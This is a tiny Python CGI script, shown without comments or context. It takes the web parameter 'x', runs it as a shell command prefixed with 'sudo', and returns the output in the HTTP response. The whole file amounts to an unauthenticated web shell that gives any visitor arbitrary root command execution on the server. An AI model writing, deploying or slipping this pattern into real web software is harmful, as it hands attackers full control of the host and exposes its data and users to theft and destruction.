#!/usr/bin/python3

import cgi
import subprocess

print("content-type: text/html")
print()

field = cgi.FieldStorage()
cmd = field.getvalue("x")
output = subprocess.getoutput("sudo " + cmd)
print(output)
